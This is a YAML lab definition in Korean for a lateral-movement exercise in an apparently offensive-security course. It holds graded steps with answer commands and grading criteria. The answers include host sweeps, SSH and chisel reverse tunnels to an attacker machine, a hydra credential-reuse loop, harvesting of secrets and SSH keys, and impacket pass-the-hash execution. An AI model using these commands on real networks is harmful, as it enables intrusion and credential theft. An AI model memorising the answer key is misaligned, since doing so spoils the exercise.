lab_id: attack-adv-nonai-week08
title: 측면 이동 (Lateral Movement)
version: non-ai
course: attack-adv-nonai
week: 8
description: 내부 네트워크에서 초기 거점으로부터 다른 시스템으로 이동하는 측면 이동 기법을 실습한다. SSH 피봇팅, 포트 포워딩, 프록시 체이닝 등을 통해 네트워크 세그먼트를
  횡단한다.
difficulty: hard
duration_minutes: 120
objectives:
- SSH 피봇팅과 다중 포트 포워딩을 구성한다
- proxychains를 활용한 다단계 네트워크 접근을 수행한다
- 내부 서비스 발견과 자격증명 재사용 공격을 실행한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: 초기 거점에서 내부 네트워크를 탐색하라. arp 테이블과 네트워크 인터페이스를 확인하여 도달 가능한 네트워크를 식별하라.
  hint: ip addr, ip route, arp -a 명령으로 네트워크 정보를 수집한다
  category: recon
  points: 10
  answer: ip addr show && echo '---' && ip route show && echo '---' && arp -a 2>/dev/null || ip neigh
    show && echo '---' && cat /etc/resolv.conf
  answer_detail: 측면 이동의 첫 단계는 현재 호스트의 네트워크 위치를 파악하는 것이다. 다중 NIC, 라우팅 테이블, ARP 캐시에서 인접 네트워크와 호스트를 식별한다.
    /etc/resolv.conf의 DNS 서버 주소는 도메인 컨트롤러를 가리키는 경우가 많다.
  verify:
    type: output_contains
    expect: 10.20.30
    field: stdout
    semantic:
      intent: 초기 거점 네트워크 탐색 — ip addr + ip route + arp -a (또는 ip neigh) + cat /etc/resolv.conf. 다중 NIC/라우팅/ARP
        캐시 → 인접 네트워크. resolv.conf DNS = DC 가리킬 수 있음. MITRE T1016 + T1083.
      success_criteria:
      - ip addr + ip route + arp/neigh + resolv
      - 10.20.30 출력
      - 4종 정보 모두
      acceptable_methods:
      - ip addr/route/neigh + cat resolv
      - ifconfig + route -n + arp -a
      - LinPEAS network 섹션
      negative_signs:
      - 명령 2종 이하
      - DNS 정보 없음
      - 라우팅 미확인
  target_vm: attacker
- order: 2
  instruction: ping 스위프를 수행하여 10.20.30.0/24 대역의 활성 호스트를 탐지하라. for 루프를 사용하여 빠르게 스캔하라.
  hint: ping -c 1 -W 1 옵션으로 1초 타임아웃으로 빠르게 스캔한다
  category: recon
  points: 10
  answer: for i in $(seq 1 254); do (ping -c 1 -W 1 10.20.30.$i &>/dev/null && echo "10.20.30.$i alive")
    & done; wait 2>/dev/null; echo 'Sweep complete'
  answer_detail: ping 스위프는 ICMP를 사용한 빠른 호스트 탐지 방법이다. 백그라운드 병렬 실행(&)으로 속도를 높이고, -W 1로 타임아웃을 설정한다. ICMP가
    차단된 환경에서는 TCP 포트 스캔(nmap -sn -PS22,80,445)이나 ARP 스캔(arp-scan)을 대안으로 사용한다.
  verify:
    type: output_contains
    expect: alive
    field: stdout
    semantic:
      intent: 'ping 스위프 — for i in $(seq 1 254); do (ping -c 1 -W 1 10.20.30.$i &); done; wait. ICMP 빠른
        호스트 탐지. 병렬 (&) + -W 1 타임아웃. ICMP 차단 시: nmap -sn -PS22,80,445 또는 arp-scan. MITRE T1018.'
      success_criteria:
      - seq 1 254 + ping 루프
      - alive 키워드
      - 병렬 실행 (&)
      acceptable_methods:
      - 병렬 ping
      - fping -a -g
      - nmap -sn -PS
      negative_signs:
      - 루프 없음
      - 단일 호스트
      - 병렬 없음
  target_vm: attacker
- order: 3
  instruction: SSH 로컬 포트 포워딩으로 피봇팅을 구성하라. {{WEB_IP}}을 통해 {{SECU_IP}}00:443(Wazuh)에 접근하는 명령을 구성하라.
  hint: ssh -L 로컬포트:원격:원격포트 사용자@피봇호스트 형태이다
  category: exploit
  points: 10
  answer: '🖥️ UI: Wazuh Dashboard(https://SIEM_IP:443) 접속 → 해당 메뉴 확인

    📎 참고 (CLI): echo ''=== SSH Local Port Forwarding ==='' && echo ''ssh -L 9443:10.20.30.100:443 ccc@10.20.30.80
    -N -f'' && echo '''' && echo ''Access Wazuh via: https://localhost:9443'' && echo '''' && echo ''Multiple
    forwards:'' && echo ''ssh -L 9443:10.20.30.100:443 -L 9022:10.20.30.1:22 -L 9080:10.20.30.100:5601
    ccc@10.20.30.80 -N -f'' && echo '''' && echo ''Current SSH config:'' && cat ~/.ssh/config 2>/dev/null
    | head -10 || echo ''No SSH config found'''
  answer_detail: SSH 로컬 포트 포워딩(-L)은 공격자 머신의 로컬 포트를 SSH 터널을 통해 원격 호스트의 서비스에 연결한다. 다중 -L 옵션으로 여러 서비스를 동시에
    포워딩할 수 있다. -N은 셸 미실행, -f는 백그라운드 실행이다. 이를 통해 방화벽으로 분리된 네트워크 세그먼트에 접근한다.
  verify:
    type: output_contains
    expect:
    - SSH Local Port Forwarding
    - SSH 로컬 포트 포워딩
    field: stdout
    semantic:
      intent: SSH 다중 로컬 포워딩 — ssh -L 9443:10.20.30.100:443 -L 9022:10.20.30.1:22 -L 9080:10.20.30.100:5601
        ccc@10.20.30.80 -N -f. 방화벽 분리 세그먼트 접근. -N 셸 미실행/-f 백그라운드. 다중 -L로 동시 다중 포워딩. MITRE T1572.
      success_criteria:
      - SSH Local Port Forwarding 키워드
      - 다중 -L 또는 단일 -L
      - -N -f 백그라운드
      acceptable_methods:
      - 다중 -L
      - SSH config LocalForward
      - putty -L
      negative_signs:
      - 단일 포워딩만
      - -f 없음
      - 다중 포워딩 가능성 누락
  target_vm: attacker
- order: 4
  instruction: SSH 동적 포트 포워딩(SOCKS 프록시)을 구성하고, proxychains로 도구를 라우팅하는 방법을 보여라.
  hint: ssh -D로 SOCKS 프록시를 생성하고, proxychains.conf를 설정한다
  category: exploit
  points: 10
  answer: 'echo ''=== SSH Dynamic Port Forwarding + Proxychains ==='' && echo ''1. Create SOCKS proxy:
    ssh -D 1080 ccc@10.20.30.80 -N -f'' && echo '''' && echo ''2. Configure proxychains:'' && echo ''echo
    "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf'' && echo '''' && echo ''3. Route tools through
    proxy:'' && echo ''proxychains nmap -sT -p 22,80,443 10.20.30.100'' && echo ''proxychains curl http://10.20.30.100:5601''
    && echo ''proxychains ssh ccc@10.20.30.1'' && echo '''' && cat /etc/proxychains4.conf 2>/dev/null
    | tail -5 || echo ''proxychains config not found'''
  answer_detail: SSH 동적 포워딩(-D)은 SOCKS5 프록시를 생성하여 모든 TCP 트래픽을 터널로 라우팅한다. proxychains는 임의의 프로그램을 SOCKS
    프록시를 통해 실행하는 래퍼이다. nmap, curl, ssh 등 대부분의 TCP 도구를 피봇 호스트를 통해 내부 네트워크에서 실행할 수 있다.
  verify:
    type: output_contains
    expect: Proxychains
    field: stdout
    semantic:
      intent: SOCKS + proxychains — ssh -D 1080 ccc@web -N -f + /etc/proxychains4.conf에 socks5 127.0.0.1
        1080 + proxychains nmap/curl/ssh. SOCKS5로 모든 TCP 라우팅. nmap -sT (Connect, SOCKS 호환). MITRE T1090.001.
      success_criteria:
      - Proxychains 키워드 + 설정
      - ssh -D 1080 + 도구 라우팅
      - 도구 3개 이상 (nmap/curl/ssh)
      acceptable_methods:
      - proxychains4 설정
      - tsocks
      - Bash redsocks
      negative_signs:
      - -D 없음
      - proxychains 설정 없음
      - 도구 1개만
  target_vm: attacker
- order: 5
  instruction: SSH 리버스 포트 포워딩(-R)을 구성하라. 내부 호스트에서 외부로 나가는 터널을 통해 서비스를 노출하는 시나리오를 설명하라.
  hint: ssh -R 원격포트:로컬:로컬포트 형태로 리버스 터널을 구성한다
  category: exploit
  points: 10
  answer: 'echo ''=== SSH Reverse Port Forwarding ==='' && echo ''Scenario: Internal host has outbound
    SSH but no inbound'' && echo '''' && echo ''On internal host (10.20.30.100):'' && echo ''ssh -R 9100:127.0.0.1:5601
    ccc@10.20.30.201 -N -f'' && echo '''' && echo ''Result: attacker can access Wazuh at localhost:9100''
    && echo '''' && echo ''Reverse SOCKS (pivot from inside):'' && echo ''ssh -R 1080 ccc@10.20.30.201
    -N -f'' && echo ''-> Creates SOCKS proxy on attacker machine'' && echo ''-> Routes traffic through
    internal host'''
  answer_detail: SSH 리버스 포워딩(-R)은 내부 호스트에서 외부로 터널을 생성한다. 방화벽이 인바운드를 차단하지만 아웃바운드 SSH를 허용하는 경우에 유용하다. 리버스
    SOCKS(-R 1080)는 내부 네트워크 전체를 피봇할 수 있어 매우 강력하다. chisel, ligolo 등의 도구도 같은 원리로 동작한다.
  verify:
    type: output_contains
    expect: Reverse Port Forwarding
    field: stdout
    semantic:
      intent: SSH Reverse 포워딩 -R — 내부에서 ssh -R 9100:127.0.0.1:5601 ccc@attacker -N -f. 인바운드 차단/아웃바운드 SSH
        허용 환경. 리버스 SOCKS (-R 1080) → 공격자가 내부 네트워크 전체 피봇. chisel/ligolo 동일 원리. MITRE T1572 + T1090.002.
      success_criteria:
      - Reverse Port Forwarding 키워드
      - -R 옵션 + 내부→외부
      - 리버스 SOCKS 옵션 언급
      acceptable_methods:
      - ssh -R
      - chisel reverse + R:socks
      - ligolo-ng tunnel
      negative_signs:
      - -R 없음
      - 리버스 SOCKS 누락
      - 방화벽 시나리오 없음
  target_vm: attacker
- order: 6
  instruction: 자격증명 재사용(Credential Reuse) 공격을 시뮬레이션하라. 한 호스트에서 획득한 자격증명으로 다른 호스트에 접근을 시도하라.
  hint: 동일 비밀번호가 여러 시스템에서 사용되는지 hydra로 테스트한다
  category: exploit
  points: 10
  answer: 'echo ''=== Credential Reuse Attack ==='' && echo -e ''10.20.30.1\n10.20.30.80\n10.20.30.100''
    > /tmp/targets.txt && echo ''admin'' > /tmp/cred_user.txt && echo ''admin123'' > /tmp/cred_pass.txt
    && echo '''' && echo ''Testing credentials across network:'' && for target in 10.20.30.1 10.20.30.80
    10.20.30.100; do echo "Target: $target"; hydra -l admin -p admin123 ssh://$target -t 2 -V 2>&1 | tail
    -3; echo ''---''; done'
  answer_detail: 자격증명 재사용은 측면 이동에서 가장 흔한 기법이다. 관리자가 여러 시스템에 동일한 비밀번호를 사용하면, 하나의 시스템에서 자격증명을 탈취하면 전체 네트워크로
    확산된다. 이를 방지하려면 LAPS(Local Administrator Password Solution), 비밀번호 볼트, 고유 비밀번호 정책을 적용해야 한다.
  verify:
    type: output_contains
    expect: Credential Reuse
    field: stdout
    semantic:
      intent: '자격증명 재사용 — for target in $(cat targets); do hydra -l admin -p admin123 ssh://$target -t
        2 -V; done. 동일 비번 다수 시스템 → 1개 탈취 = 전체 확산. MITRE T1078 + T1110. 방어: LAPS + 비밀번호 볼트 + 고유 비번. CWE-798.'
      success_criteria:
      - Credential Reuse 키워드
      - 다중 타겟 루프 + hydra
      - 방어 (LAPS) 언급
      acceptable_methods:
      - hydra 다중 타겟
      - CrackMapExec --pass admin123
      - evil-winrm 자동 시도
      negative_signs:
      - 단일 타겟
      - 재사용 맥락 없음
      - 방어 없음
  target_vm: attacker
- order: 7
  instruction: 내부 호스트에서 추가 자격증명을 수집하라. 설정 파일, 히스토리, 환경변수에서 비밀번호를 검색하라.
  hint: grep -r로 password, passwd, credential 등의 키워드를 검색한다
  category: recon
  points: 10
  answer: echo '=== Credential Harvesting ===' && echo '[History files]' && cat ~/.bash_history 2>/dev/null
    | grep -iE '(pass|ssh|mysql|curl.*-u)' | tail -5 && echo '[Config files]' && find /home /etc /var/www
    -name '*.conf' -o -name '*.cfg' -o -name '*.env' -o -name '.env' 2>/dev/null | head -10 && echo '[Environment]'
    && env | grep -iE '(pass|key|token|secret)' 2>/dev/null | head -5 && echo '[SSH keys]' && find /home
    -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null
  answer_detail: 내부 호스트에서 자격증명은 다양한 위치에 존재한다. .bash_history에 평문 비밀번호가, .env 파일에 API 키가, SSH 키 파일에 개인키가
    있을 수 있다. 웹 애플리케이션의 설정 파일(database.yml, wp-config.php, .env)에는 DB 접속 정보가 포함된다.
  verify:
    type: output_contains
    expect: Credential Harvesting
    field: stdout
    semantic:
      intent: 자격증명 헌팅 — .bash_history (pass/ssh/mysql/curl -u) + find /home /etc /var/www -name *.conf/*.env
        + env (key/token/secret) + SSH 키 (id_rsa/id_ed25519). DB 설정(database.yml/wp-config/.env). MITRE
        T1552.001 Credentials In Files.
      success_criteria:
      - Credential Harvesting 키워드
      - history + config + env + SSH key 4종
      - 민감 키워드 grep
      acceptable_methods:
      - 수동 grep 종합
      - LinPEAS credentials 섹션
      - LaZagne All Modules
      negative_signs:
      - 1-2종만 검색
      - 민감 키워드 없음
      - 체계 부족
  target_vm: attacker
- order: 8
  instruction: chisel을 사용한 터널링을 시뮬레이션하라. chisel 서버/클라이언트 구성과 SOCKS 프록시 설정 과정을 문서화하라.
  hint: chisel server/client 명령의 사용법과 아키텍처를 설명한다
  category: exploit
  points: 10
  answer: 'echo -e ''=== Chisel Tunneling ===\n\n[Server (Attacker - 10.20.30.201)]\nchisel server --reverse
    --port 8080\n\n[Client (Victim - internal host)]\nchisel client 10.20.30.201:8080 R:socks\n\n[Result]\nSOCKS5
    proxy on attacker:1080\nAll traffic routes through victim host\n\n[Usage]\nproxychains nmap -sT 10.20.30.0/24\nproxychains
    curl http://internal-service\n\n[Advantages over SSH]\n- Single binary, no SSH server needed\n- HTTP-based,
    passes through web proxies\n- Supports SOCKS5 and port forwarding\n- Can tunnel through corporate
    proxies\n\n[Alternative tools]\n- ligolo-ng: TUN interface (full network access)\n- rpivot: SOCKS4
    reverse proxy\n- ssf: SSH-like tunneling without SSH'''
  answer_detail: chisel은 Go로 작성된 HTTP 기반 터널링 도구로, SSH 없이도 포트 포워딩과 SOCKS 프록시를 구성할 수 있다. HTTP를 사용하므로 웹 프록시를
    통과할 수 있고, 단일 바이너리로 배포가 간편하다. ligolo-ng는 TUN 인터페이스를 생성하여 proxychains 없이 직접 네트워크에 접근할 수 있어 더 편리하다.
  verify:
    type: output_contains
    expect: Chisel Tunneling
    field: stdout
    semantic:
      intent: 'chisel 터널 — Server: chisel server --reverse --port 8080 + Client: chisel client attacker:8080
        R:socks → 공격자 SOCKS5 1080. HTTP 기반 → 웹 프록시 통과. 단일 바이너리. 대안: ligolo-ng (TUN, full network) / rpivot
        (SOCKS4) / ssf. MITRE T1090.'
      success_criteria:
      - Chisel Tunneling 키워드
      - server + client + R:socks
      - 대안 도구 (ligolo/rpivot) 언급
      acceptable_methods:
      - chisel reverse + SOCKS
      - ligolo-ng TUN
      - rpivot reverse SOCKS4
      negative_signs:
      - chisel 명령 없음
      - 단일 도구만
      - HTTP 기반 장점 누락
  target_vm: attacker
- order: 9
  instruction: WMI/PSExec를 통한 Windows 측면 이동 기법을 분석하라. impacket 도구 모음의 활용법을 정리하라.
  hint: impacket의 psexec.py, wmiexec.py, smbexec.py 등의 사용법을 문서화한다
  category: exploit
  points: 10
  answer: 'echo -e ''=== Windows Lateral Movement with Impacket ===\n\n[PsExec] - Creates service, uploads
    binary\nimpacket-psexec domain/user:password@target\nimpacket-psexec domain/user@target -hashes :NTLM_HASH\n\n[WMIExec]
    - WMI process creation, semi-interactive\nimpacket-wmiexec domain/user:password@target\n\n[SMBExec]
    - Creates service via SCM\nimpacket-smbexec domain/user:password@target\n\n[ATExec] - Scheduled task
    execution\nimpacket-atexec domain/user:password@target command\n\n[DCOMExec] - DCOM/MMC20 execution\nimpacket-dcomexec
    domain/user:password@target\n\n[Detection]\n- PsExec: Service creation (Event 7045) + named pipe\n-
    WMIExec: WMI activity (Event 5861)\n- SMBExec: Service creation + SMB writes\n- All: Logon Event 4624
    Type 3 (Network)'''
